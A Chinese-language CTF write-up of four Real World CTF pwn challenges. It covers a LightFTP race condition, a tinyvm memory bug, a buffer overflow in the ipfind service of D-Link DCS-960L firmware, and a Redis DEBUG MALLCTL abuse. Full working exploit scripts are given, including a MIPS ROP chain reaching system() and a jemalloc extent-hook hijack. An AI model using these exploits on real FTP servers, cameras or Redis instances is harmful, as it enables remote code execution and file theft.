# Pwn

這次我第一次參加 RWCTF，一開始還不知道這場 CTF 的特色 (0-day / 1-day)，所以浪費了一些時間在看重複的東西，不過後來有順利找到目標，雖然最後沒有打成功，但是過程還滿有趣的。



## NonHeavyFTP

能從 Dockerfile 得知此題直接使用 https://github.com/hfiref0x/LightFTP 作為題目，而由名稱就能知道此專案設計了一個輕量化的 FTP service。

前面會做一些初始化，而後 connect thread 偵測到有連線進來時，會呼叫 thread 執行 `ftp_client_thread()` 來處理此 client 的請求，而 function 的參數是連線進來 client 的 socket。

Function 是 `recvcmd()` 包裝了 `recv()`，一次接收 1024 大小的資料或是讀到 `"\r\n"`，同時此 function 也確保讀資料時不會有問題。程式接下來會比較前幾個字元是否等於 `ftpprocs[]` 的某個字元，如果是的話就丟給該命令的 handler 來處理，以下為 array 的變數宣告：

```c
static const FTPROUTINE_ENTRY ftpprocs[MAX_CMDS] = {
    {"USER", ftpUSER}, {"QUIT", ftpQUIT}, {"NOOP", ftpNOOP}, {"PWD",  ftpPWD },
    {"TYPE", ftpTYPE}, {"PORT", ftpPORT}, {"LIST", ftpLIST}, {"CDUP", ftpCDUP},
    {"CWD",  ftpCWD }, {"RETR", ftpRETR}, {"ABOR", ftpABOR}, {"DELE", ftpDELE},
    {"PASV", ftpPASV}, {"PASS", ftpPASS}, {"REST", ftpREST}, {"SIZE", ftpSIZE},
    {"MKD",  ftpMKD }, {"RMD",  ftpRMD }, {"STOR", ftpSTOR}, {"SYST", ftpSYST},
    {"FEAT", ftpFEAT}, {"APPE", ftpAPPE}, {"RNFR", ftpRNFR}, {"RNTO", ftpRNTO},
    {"OPTS", ftpOPTS}, {"MLSD", ftpMLSD}, {"AUTH", ftpAUTH}, {"PBSZ", ftpPBSZ},
    {"PROT", ftpPROT}, {"EPSV", ftpEPSV}, {"HELP", ftpHELP}, {"SITE", ftpSITE}
};
```

請求的過程中基本上都使用 `PFTPCONTEXT` 來紀錄 client 的狀態，結構如下：

```c
typedef struct _FTPCONTEXT {
	// ...
    char                CurrentDir[PATH_MAX];
    char                RootDir[PATH_MAX];
    char                RnFrom[PATH_MAX];
    char                FileName[2*PATH_MAX];
	// ...
} *PFTPCONTEXT;
```

下面稍微看一下各個 command 做了什麼：

- USER - 輸入使用者名稱，狀態更新為 `FTP_ACCESS_NOT_LOGGED_IN`
  - 狀態一共分成 `FTP_ACCESS_{NOT_LOGGED_IN,READONLY,CREATENEW,FULL}`，除了第一個之外，其他都是代表已經登入
- QUIT - 離開
- NOOP - 測試
- PWD - 登入使用，回傳 `context->FileName`
- TYPE - 登入使用，沒意義
- PORT - 登入使用，更新 IP、Port，並將模式設成 normal
- LIST - 登入使用
- CDUP - 登入使用，只回傳目錄名稱
- CWD - 登入使用，當前目錄名稱
- RETR - 登入使用，讀檔案，呼叫 thread `retr_thread()` 處理，沒有驗證權限
- ABOR - 登入使用，cleanup worker
- DELE - 登入使用，刪除檔案，沒有驗證權限
- PASV - 登入使用，進入 passive mode，建立一個 datasocket 接收資料
- PASS - 密碼認證，而成功登入後 Access 的權限應該為 `FTP_ACCESS_READONLY`
- REST - 登入使用，調整 `RestPoint`
- SIZE - 登入使用，取得檔案大小
- MKD - 登入使用，新增目錄，不過預設權限不夠
- RMD - 登入使用，刪除目錄，不過預設權限不夠
- STOR - 登入使用，呼叫 thread `stor_thread()` 處理，將資料寫入檔案
- SYST - 沒意義
- FEAT - 沒意義
- APPE - 登入使用，刪除檔案，不過預設權限不夠
- RNFR - 登入使用，rename from，設置目標檔案，不過預設權限不夠
- RNTO - 登入使用，rename to，設置新的名稱，不過預設權限不夠
- OPTS - optional，不支援其他功能
- MLSD - 登入使用，呼叫 thread `mlsd_thread()` 處理，感覺是列出目錄底下的檔案
- AUTH - 開啟 TLS
- PBSZ - 設置 block size
- PROT - 登入使用，設置 `context->DataProtectionLevel`
- EPSV - 與 PASV 相同
- HELP - help
- SITE - 支援 chmod

關於 FTP 的使用，可以參考該[文章](https://medium.com/@penril0326/%E7%B0%A1%E5%96%AE%E4%BB%8B%E7%B4%B9ftp-67bd4df922b2)，這邊大概介紹一下。FTP 作為簡單的檔案傳輸服務，分成主動模式 (active) 與被動模式 (passive)，而主動模式會使用到兩個 port，分別為 command port 與 data port， 前者開在 port 21，後者則是 port 20。Passive 則是讓 server 選一個沒有在使用的 port 作為 data port，因此在呼叫完 `PASV` 或是 `EPSV` 後會回傳 data port，需要再另外建一個連線來接收資料，而每個 data port 都只用於一次的傳輸。



而在呼叫一些 function 時，有可能會透過 `ftp_effective_path()` 來驗證與 normalize 目標目錄，並將最後的目錄名稱存在於 `context->FileName`，該變數實際上並非只儲存 filename，實際上被當作 client 的 temp buffer 來使用，所以許多命令的執行過程都會使用到此資料。

但問題就在於任何與 data 相關的命令，都會另外開一個 child thread 來做非同步處理，但是 `context->FileName` 作為目錄名稱，有可能在原本的 thread 被拿來做為其他命令的參數，導致影響到 child thread 執行的流程。

利用命令 `USER XXX` 可以穩定的控制 `context->FileName` 成 `XXX`，所以執行 `RETR hello.txt` 後，馬上執行命令 `USER /flag`，就能在 `retr_thread()` 開啟檔案時把檔案名稱改成 `/flag`，藉此讀到根目錄底下的 flag，同樣的如果不知道檔案名稱，也可以利用 `LIST YYY` 讀取目錄 `YYY` 的檔案屬性，exploit 如下：

```python
#!/usr/bin/python3

from pwn import *

r = remote('localhost', 2121)
r.newline = '\r\n'

r.recvline()
r.sendline('USER anonymous')
r.recvline()
r.sendline('PASS 1234')
r.recvline()
r.sendline('EPSV')
r.recvuntil('|||')
dp = int(r.recvuntil('|', drop=True))
info(f"data port: {dp}")
dr = remote('localhost', dp)

"""
r.sendline('LIST /')
r.recvline()
r.sendline('USER /')
r.recvline()
"""
flag_name = "flag.0063859a-9291-11ed-9d14-0242ac110003"

r.sendline('RETR hello.txt')
r.recvline()
r.sendline(f'USER /{flag_name}')
r.recvline()

print(dr.recv())
r.interactive()
```



## Tinyvm

直接拿專案 [tinyvm](https://github.com/jakogut/tinyvm) 作為題目，漏洞成因很明顯也滿好猜測的到，因為在 VM 當中能夠模擬指令執行，而指令大多都會使用到記憶體位址，如果範圍沒有控制好，很容易存取到 fake RAM 之外地方，而如果 fake RAM 是透過 mmap 所建立，則可以 bypass aslr 做利用。

找到問題與利用方法，再來思考要怎麼控制執行流程，並且找出 remote 使用的 library 版本，然而在此 VM 當中有一個特別的 instruction 為 `prn`，他可以把指定記憶體的值印出來，所以整個攻擊流程如下：

1. 由於知道 mmap 大小，所以知道 library 位址，從 base 不斷將資料印出並寫到檔案中，戳到 segfault (連線中斷後) 就知道到尾巴了
2. 算出目標 function 的 offset 後，相減得到 libc base
3. 蓋寫被 mangle 過的 exit_hook pointer 成 `system()`
4. 蓋寫 TLS 的 canary value 成 0
5. 蓋寫 exit_hook 執行時 rdi 指向的記憶體位址成 `"/bin/sh\x00"`
6. 離開 interactive shell

Exploit 與題目的細節可以參考該[文章](https://rivit.dev/post/real-world-ctf-5th-tinyvm-pwn/)。





## Shellfind

壓縮檔裡面附了一個 firmware `firmware.bin`，用 `binwalk` 可以解出一個 squashfs filesystem，用命令 `unsquashfs` 可以 extract 檔案出來，稍微看一下後會發現根目錄有 `/mydlink`，並且配合 `grep` 與一些字串過濾，可以知道此裝置的型號是 DCS-960L，為 Dlink 無線網路攝影機的其中一個型號。

在官網上可以找到該裝置的 [firmware](https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L)，首先要知道的就是 patch 的地方，所以直接拿兩個目錄出來做 diff，會發現只有 ipfind 這隻程式不一樣：

```bash
diff -r ~/Downloads/DCS-960L_A1_FW_1.09.02_20191128_r4588/_DCS-960L_A1_FW_1.09.02_20191128_r4588.bin.extracted/squashfs-root squashfs-root

...
Binary files /<redacted>/DCS-960L_A1_FW_1.09.02_20191128_r4588/_DCS-960L_A1_FW_1.09.02_20191128_r4588.bin.extracted/squashfs-root/usr/sbin/ipfind and squashfs-root/usr/sbin/ipfind differ
...
```

透過簡單的逆向以及分析，能知道 ipfind 是用來通知內網其他設備，新使用者 (device) 連進來的訊息，通知的方法是用 broadcasting 的方式，而使用者傳輸的內容與格式跟請求種類有關係。

一共分成兩種操作，第一種是使用者會戴上應該是 ip 之類的訊息，ipfind 接收後會從 local config 內讀資料，最後包裝成特定格式送出，而第二種類似於登入的功能，使用者會傳 base64 後的 USER 跟 PASS 給 ipfind，在經過字串比對後 ipfind 會將結果傳給其他 device。

Patch 的地方在第一種操作，原本會 broadcasting 給其他裝置，但是現在是直接將資料回傳，這個 patch 本身不會帶來問題，只是用來拿資料而已，但是當初在解題時一直認為這個地方可以利用，所以卡了一陣子。漏洞其實是出在第二個操作，當解析 base64 字串時，因為接收 decode result 的 buffer 只有 0x100 大，但是接收資料的大小是 0x800，因此在 decode 後會造成 buffer overflow 的情況，以下為 pseudo code：

```c
int __fastcall user_check(char *a1, char *a2)
{
    // ...
    char v6[256]; // [sp+18h] [-344h] BYREF
    char v7[256]; // [sp+118h] [-244h] BYREF
    char v8[256]; // [sp+218h] [-144h] BYREF
    char v9[68]; // [sp+318h] [-44h] BYREF

    memset(v9, 0, 64);
    Base64decs(a1, v6);
    Base64decs(a2, v7);
    // ...
    return Pass;
}
```

當知道漏洞成因後，開始分析 exploit 的環境，而 ipfind 是一個 mips 架構的執行檔，並且除了 ASLR 之外，沒有其他保護機制：

```
Arch:     mips-32-big
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

看起來非常好利用，但是利用環境中的 ROP gadget 有許多的限制：

1. 沒有 stdout，因此需要知道字串 pointer，但是我們沒有 stack address
2. 沒有 `add rsp, XXX ; jmp rsp` 這種 gadget
3. 控制參數 (a0) 的 gadget 一定會配合一個 function call，而 function call 由暫存器 `$gp` 決定
4. `$gp` 存放 GOT address，因此修改 `$gp` 會讓 function (system) 解析時壞掉

基本上就是 gadget 種類太少，每個 gadget 的功能又相近，因此主要的考點是利用技巧，下方參考幾個參賽隊伍的 writeup 做分析。

P.S. binary 本身為 big endian，所以 pack 時需要注意一下。



---

> https://larry.ngrep.me/2023/01/11/rwctf-5th-shellfind-write-up/

安裝完 FirmAE 後以 debug mode 執行起來：

```bash
sudo ./run.sh -d DIR868L mydlink/DCS-960L_A1_FW_1.09.02_20191128_r4588.bin
```

- `-d` 是因為 debug mode 有提供 shell 可以執行
- 可以把 `firmare.config` TIMEOUT 調小一點，這樣會比較快執行

而在目錄 `/firmadyne` 底下有比較完整功能的 busybox，用 netstat 做 recon：

```bash
~ # /firmadyne/busybox netstat -lnp
...
udp        0      0 0.0.0.0:62976  0.0.0.0:*   910/ddp
udp        0      0 0.0.0.0:62720  0.0.0.0:*   766/ipfind
```

會發現 `ipfind` 服務開在 udp port 62720，而後透過內建的 `gdbserver` attach 上 ipfind 動態 debug，然後發現原本的 exploit 沒有加 `context.endian = big`，設完之後就可以正常執行 ROP，並且發現原本打的 exploit 其實是成功的，但是用來測試的命令是 `curl`，而題目環境 tun/tap 沒有辦法存取到外部的網路，因此都要利用同一個連線來打成功。成功執行 `system(cmd)` 的腳本如下：

```python
#!/usr/bin/python3

from pwn import *
from base64 import b64encode, b64decode

context.arch = 'mips'
context.endian = 'big'

r = remote('192.168.0.1', 62720, typ='udp')

def first():
    payload =  b"FIVI" # magic
    payload += b"\x00\x00\x00\x00"
    payload += b"\n" # newline
    payload += b"\x01\x00" # check1
    payload += b"\x00" * 6 # dummy, affect response byte-11, byte-12
    payload += b"\xff\xff\xff\xff\xff\xff" # magic_string
    payload += b"\x00\x00" # check2
    payload += b"\x00\x00\x00\x00" # check3
    return payload

def second():
    payload =  b"FIVI" # magic
    payload += b"\x00\x00\x00\x00"
    payload += b"\n" # newline
    payload += b"\x02\x00" # check1
    payload += b"\x00" * 6 # dummy, affect response byte-11, byte-12
    payload += b"\x52\x54\x00\x12\x34\x56" # magic_string
    payload += b"\x00\x00" # check2
    payload += b"\x8e\x00\x00\x00" # check3
    payload += b64encode(b"1234")
    payload = payload.ljust(93, b'\x00')

    rop = b'A'*(256 + 256 + 68)
    # 0x004016F8 : call system
    # 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
    # 0x00401054 : addiu $a0, $sp, 0x118 ; lw $t9, -0x7f9c($gp) ; jalr $t9 ; addiu $a1, $sp, 0x218
    got_system = 0x41310C
    gp = 0x0041b030
    
    ## resolve system
    rop += p32(0) * 2
    rop += p32(0x00400c9c)

    rop += b'\x00' * 0x10 # to 0x10
    rop += p32(gp)
    rop += p32(0) * 2 # to 0x1c
    rop += p32(0x004016F8)

    rop += b'\x00' * 0x54
    rop += p32(0x00400c9c)

    rop += b'\x00' * 0x10 # to 0x10
    rop += p32(got_system + 0x7f9c)
    rop += p32(0) * 2 # to 0x1c
    rop += p32(0x00401054)

    rop += b'\x00' * 0x118
    rop += b'touch /tmp/fuck\x00'
    payload += b64encode(rop)
    print(hex(len(payload)))

    return payload

p1 = first()
p2 = second()

def exp():
    r.send(p2)

def test():
    r.send(p1)

exp()
#test()
r.interactive()
```

- `$gp` 在 resolve 時會需要，所以要先讓 `system()` 被解析
- 解析後配合 ROP 讓 stack 位址變成參數 a0，再透過 `$gp` 控制 return address，執行 `system(cmd)`



下個考點在於要怎麼 **reuse 當前連線**，取得目錄資訊與檔案並回傳，有人提到可以透過 `system("sh<&3")` 來上傳 udp shell，而下面提供官方與他人的 writeup 其他打法：

- [Swing (official)](https://mp.weixin.qq.com/s/Wb7SMy8AHtiv71kroHEHsQ)
- [nobodyisnobody (Water Paddler)](https://github.com/nobodyisnobody/write-ups/tree/main/RealWorldCTF.2022/pwn/Shellfind)





## Hardened Redis

> Redis 0-day RCE
>
> 參考： https://github.com/pwning/public-writeup/tree/master/rwctf2023/pwn_hardenedredis



Redis 是一個 key-value storage (or 可以稱作 db)，而一般的 storage / db 都是以硬碟作為儲存區，而 redis 則會把資料存在 memory 當中，大幅提升存取速度。雖然 redis 支援認證、權限控管，但基本上預設是不會打開的，並且 ubuntu 裝完 redis 後只允選 loopback interface 存取，因此能接觸到 redis service 就已經是 trusted  client 了。

實際上過去也有[文章](http://antirez.com/news/96)提到只要能存取到 redis 服務，就能在一些情況下達到任意寫檔，最後藉由控制 ssh authorized key list 取得 shell，不過在預設 config 的情況下達到 RCE，漏洞的成因與利用方法還是很值得好好研究，下面為此文章的一些重點筆記：

- Redis security model 為 "it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself"，代表信任的使用者才能使用 redis
  - 但即使官方這樣說明，還是有許多人把 redis export 出來
- 測試環境為 macbook 安裝 redis 並且使用預設 config，而 macbook 有跑 ssh server
- 接下來透過 `redis-cli` 與 redis 互動，透過 `config set <dir>` 設置 config 的目錄，而 `config set dbfilename <name>` 則設置檔案名稱，如果把 dir 設為 .ssh，而 name 設成 `authorized_keys`，就能把 db dump 到 `authorized_keys` 當中，而 `-x set <name>` 可以設 key:value pair，所以 db 內雖然格式很亂，但會包含我們的 key
- 使用 ACL (access control list) 有很大的好處



---

首先觀察與 default config 的不同：

```
bind 0.0.0.0 ::1
protected-mode no

rename-command MODULE ""
rename-command CONFIG ""
rename-command SCRIPT ""
rename-command SAVE ""
```

差別在於外網可以碰到 redis，protected mode 關閉所以不需要認證，以及 "MODULE", "CONFIG", "SCRIPT" 以及 "SAVE" 四個命令都不能使用 (hardened)，但是 "DEBUG" 並沒有被 disable。

由於 redis codebase 很大，所以我們要找出跟我們輸入比較相關的程式碼來分析，而這可以透過直接在 redis-6.0.16 的 source code 搜錯誤訊息字串來分析，舉例來說：

```
DEBUG
-ERR wrong number of arguments for 'debug' command
```

搜字串會發現錯誤訊息是在 `processCommand()`，而這個 function 會根據命令字串來找 `struct redisCommand` 物件，在用 function 回傳的記憶體位置找出結構中比較關鍵的成員來分析，像是 debug `redisCommand` 物件的 `redisCommandProc` 成員指向 `debugCommand()`，即是 DEBUG 命令的 function handler。

下方為 `debugCommand()` 中可以使用的功能以及簡單介紹，實際上也可以下 `"DEBUG help"` 取得這些資訊：

```
"ASSERT -- Crash by assertion failed.",
"CHANGE-REPL-ID -- Change the replication IDs of the instance. Dangerous, should be used only for testing the replication subsystem.",
"CRASH-AND-RECOVER <milliseconds> -- Hard crash and restart after <milliseconds> delay.",
// ...
"STRINGMATCH-TEST -- Run a fuzz tester against the stringmatchlen() function.",
```

其中有兩個命令是與調整 memory allocation 機制有關：

- `MALLCTL <key> [<val>]` - Get or set a malloc tunning integer
- `MALLCTL-STR <key> [<val>]` - Get or set a malloc tunning string

對應到的程式碼：

```c
// ...
#ifdef USE_JEMALLOC
} else if(!strcasecmp(c->argv[1]->ptr,"mallctl") && c->argc >= 3) {
    mallctl_int(c, c->argv+2, c->argc-2);
    return;
} else if(!strcasecmp(c->argv[1]->ptr,"mallctl-str") && c->argc >= 3) {
    mallctl_string(c, c->argv+2, c->argc-2);
    return;
    #endif
}
// ...
```

- 最少要有 3 個參數，也就是 `"DEBUG MALLCTL XXXXXX"`

稍微搜尋一下後，可以知道 redis 底層使用的是 JEMALLOC，而 [MALLCTL](https://nxmnpg.lemoda.net/3/mallctl#11) 則是用來動態調整 memory 分配時的設定，下面擷取 man page 的介紹：

> The mallctl() function provides a general interface for introspecting the memory allocator, as well as setting modifiable parameters and triggering actionsamp;. The period-separated *name* argument specifies a location in a tree-structured namespace; see the MALLCTL NAMESPACE section for documentation on the tree contentsamp.

`je_mallctl()` 的參數名稱為下：

```c
je_mallctl(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
```

- 當 new value / size 傳 NULL / 0 時代表示 GET
- 當 old value / size 傳 NULL / 0 時代表示 SET

MALLCTL-STR handler 會找出對應名稱的物件，並 assign 新的字串給他，source code  如下：

```c
if(argc > 1) {
    char *val = argv[1]->ptr; // 第二個參數
    char **valref = &val;
    if ((!strcmp(val,"VOID")))
        valref = NULL, sz = 0;
    // 
    wret = je_mallctl(argv[0]->ptr, NULL, 0, valref, sz);
    // ...
}
```

- 第一個參數是物件名稱 (`argv[0]->ptr`)
- 第四個參數是指向 value 的 pointer (`&argv[1]->ptr`)
- 第五個參數為 value 大小 (`sizeof(pointer)`)

要怎麼知道物件名稱有哪些，可以看 jemalloc 的原始碼，並參考 unit/ 目錄底下的 `mallctl()` function call，但具體有哪些物件可控，可以追到 `je_mallctl()` 底層所呼叫的 `ctl_lookup()`，可以發現這些物件是用 tree 的結構儲存起來，而根目錄則是變數 `super_root_node`。既然有 `ctl_lookup()`，那一定會有其他 function 是用來新增 node / child，於是在 src/ctl.c 找了一下，使用到 `CTL_PROTO` macro 的都是可以調整的設定：

```c
#define CTL_PROTO(n)							\
static int	n##_ctl(tsd_t *tsd, const size_t *mib, size_t miblen,	\
    void *oldp, size_t *oldlenp, void *newp, size_t newlen);

#define INDEX_PROTO(n)							\
static const ctl_named_node_t	*n##_index(tsdn_t *tsdn,		\
    const size_t *mib, size_t miblen, size_t i);

CTL_PROTO(version)
CTL_PROTO(epoch)
CTL_PROTO(background_thread)
...
```

而在宣告變數的地方，也會有類似建立 node 的初始化：

```c
static const ctl_named_node_t arenas_node[] = {
	{NAME("narenas"),	CTL(arenas_narenas)},
	{NAME("dirty_decay_ms"), CTL(arenas_dirty_decay_ms)},
	// ...
	{NAME("create"),	CTL(arenas_create)},
	{NAME("lookup"),	CTL(arenas_lookup)}
};
```

對於這些物件的描述都記錄在 [Man page](https://jemalloc.net/jemalloc.3.html#mallctl_namespace) 當中：

```
...
arenasamp;.create (unsigned, extent_hooks_t *) rw

Explicitly create a new arena outside the range of automatically managed arenas, with optionally specified extent hooks, and return the new arena indexamp;.
...
```

- `amp;.` 就是 `"."`

經過一些測試，能發現 `arena.1.extent_hooks` 的預設值會回傳很像記憶體位址的值：

```
DEBUG MALLCTL arena.1.extent_hooks
:140074528115200
```

實際上就是落於 libjemalloc.so.2 的記憶體，算出 offset 後可以推得 libc base。而 `MALLCTL-STR` 則是可以將記憶體的值視為字串指標，寫字串到另一塊記憶體位址，透過這個特性我們可以做到任意寫與任意讀，先用 `MALLCTL` 控制物件的值成記憶體，在用 `MALLCTL-STR` 寫/讀字串到指定位址，不過在構造做任意讀寫時，需要一個不會使用到的物件，並且該物件具有讀取與寫入的權限。

原本的作者一開始使用 `thread.prof.name` 但是對應的 handler `thread_prof_name_ctl()` --> `prof_thread_name_set()` 會檢查指向位址的字串是否包含 non-printable 字元，最後先透過 `DEBUG MALLCTL arenas.create` 建立一個新的 arena，而後透過 `DEBUG MALLCTL arena.N.extent_hooks <address>` 來做利用。

但是在測試後發現 `DEBUG MALLCTL-STR arena.N.extent_hooks` 雖然會回傳舊的 string value，但不能做到任意寫，所以目前我們只能藉由控制 arena 的 function table pointer 控制執行流程，pointer 對應到的 c 結構為下：

```c
typedef extent_hooks_s extent_hooks_t;
struct extent_hooks_s {
    extent_alloc_t          *alloc;
    extent_dalloc_t         *dalloc;
    extent_destroy_t        *destroy;
    extent_commit_t         *commit;
    
    extent_decommit_t       *decommit;
    extent_purge_t          *purge_lazy;
    extent_purge_t          *purge_forced;
    extent_split_t          *split;
    
    extent_merge_t          *merge;
};
```

原作者透過 DEBUG 的另一個功能 `DEBUG LEAK XXXXX`，讓可控的值殘留在 jeamalloc 分配的記憶體當中，並且還能塞入 `'\x00'`，並且因為 jeamalloc 是用 `mmap()` 建 heap 的，所以能夠推算出來 offset 取得物件的記憶體位址。

- 這邊有個雷，python redis package 能夠成功送出帶有 `'\x00'` 的字串並回傳 +ok，但是如果是直接用 pwntools 送的話會拿不到 response 然後卡住

到此，我們成功構建 fake function table，並且 rdi 會指向 table 的起點，不過沒有 stdin / stdout，就算能夠執行 one gadget 也不管用，因此目標還是放在 `system(cmd)`。考慮到 rdi 指向的位址要塞入命令字串，該位址剛好與 `alloc` 重疊，因此不能利用 `alloc()`，經過測試後也發現 `destroy`, `commit` 等等很難觸發，比較好觸發的就只剩 `dalloc()`。

不過 `dalloc()` 被呼叫的時間不固定，需要能穩定控制在 `alloc()` 被呼叫前就呼叫，作者是透過測試，新增更多連線 + `DEBUG LEAK` 做 spray，讓 `dalloc()` 能早點呼叫，而我猜測 redis 有一個 GC 會定期釋放不需要的記憶體，因此也是透過 spray + `PING` + `sleep()` 讓 redis 有機會對當前的 heap 做回收，這個方法就不用在建一個新的連線，但原理也是大同小異，exploit 如下：

```python
#!/usr/bin/python3

import redis
import time
from pwn import *

context.newline = '\r\n'
context.arch = 'amd64'

r = redis.Redis('localhost', 6379)

def run_cmd(cmd):
    result = r.execute_command(cmd)
    print(result)
    return result

"""
00 alloc;
08 dalloc;
10 destroy;
18 commit;
20 decommit;
28 purge_lazy;
30 purge_forced;
38 split;
"""
ext_hooks = int(run_cmd("DEBUG MALLCTL arena.1.extent_hooks"))
libc = ext_hooks - 0xb2a00 - 0x66a000
hook_alloc = libc + 0x6cdb40

fake_table = libc - 0x7ce1fd + 5
system_addr = libc + 0x50d60
info(f'libc: {hex(libc)}')
info(f'fake_table: {hex(fake_table)}')

arena = int(run_cmd("DEBUG MALLCTL arenas.create"))
info(f"arena: {arena}")

# change to new heap
run_cmd(f"DEBUG MALLCTL thread.arena {arena}")
run_cmd(f"DEBUG MALLCTL-STR arena.{arena}.dss primary")

payload =  b'1234\x00'
payload += flat(
    b'/r*>&8\x00\x00', system_addr,
    system_addr, system_addr,
    system_addr, system_addr,
)
run_cmd(b"DEBUG LEAK " + payload)
for i in range(100):
    run_cmd(b"DEBUG LEAK " + b'A'*100)
run_cmd(f"DEBUG MALLCTL arena.{arena}.extent_hooks {fake_table}")
run_cmd(f"PING")
sleep(5)
run_cmd(f"PING")
print(r.connection_pool.get_connection("name")._sock.recv(128))
input()
```

